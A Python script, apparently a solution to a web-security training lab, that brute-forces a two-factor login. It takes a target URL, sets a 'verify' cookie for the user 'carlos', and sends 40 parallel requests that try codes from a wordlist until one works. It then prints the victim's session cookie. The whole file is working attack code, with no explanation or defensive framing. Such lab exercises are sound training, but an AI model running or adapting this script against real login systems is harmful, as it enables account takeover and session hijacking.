#!/usr/bin/env python3
# from functools import partial

import requests
import multiprocessing as mp


s = requests.Session()
URL = input("Enter target url: ")
login2_url = URL + "login2"
cookies = {"verify": "carlos"}
requests.get(url=login2_url, cookies=cookies)

with open("top_9999.txt") as file:
    passwords = file.read()
    otp_list = passwords.split()


def cracker(num, event):
    data = {"mfa-code": num}
    response = s.post(url=login2_url, data=data, cookies=cookies)
    if not event.is_set():
        print(f"Trying {num}")
    if "Incorrect security code" not in response.text:
        event.set()
        cookie = s.cookies.get_dict()
        print(f'The session cookie of carlos is : {cookie["session"]}')


if __name__ == '__main__':
    m = mp.Manager()
    event = m.Event()
    pool = mp.Pool(40)
    for num in otp_list:
        pool.apply_async(cracker, (num, event))
    pool.close()
    event.wait()
    pool.terminate()

